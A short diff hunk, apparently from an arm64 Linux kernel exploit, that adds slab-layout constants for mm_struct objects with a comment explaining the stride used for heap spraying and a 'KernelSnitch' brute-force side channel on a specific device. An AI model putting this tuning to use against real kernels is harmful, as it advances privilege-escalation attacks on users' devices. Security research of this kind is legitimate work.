@@ -31,6 +31,20 @@
 #define P0_KERNEL_PHYS_LOAD 0x80000000ULL
 #define SKB_DATA_DELTA (-0xe80LL)
 
+/*
+ * sizeof(struct mm_struct) is 0x3c0 in the EZIF BTF, but the SLUB cache
+ * object is larger: SLAB_TYPESAFE_BY_RCU moves the free pointer behind the
+ * object (0x3c0 + 8) and arm64's ARCH_KMALLOC_MINALIGN (128) rounds the
+ * result up to 0x400.  KernelSnitch must walk the slab with that 0x400
+ * stride, otherwise the spray geometry and the bruteforce candidates both
+ * miss the real objects.  The same geometry is used by the SCDZF3 profile
+ * for this model and was observed on-device (mm_struct at slab+0x6c00,
+ * i.e. object 27 of a 32-object order-3 slab).
+ */
+#define MM_STRUCT_SZ 0x400
+#define MM_ORDER 3
+#define KSNITCH_COLLISIONS 5
+
 #define SLIDE_FAKE_WAITER_PRIO 0
 #define SLIDE_WAITER_WAKE_STATE 0
 #define SLIDE_LOCK_OWNER_VALUE 1ULL
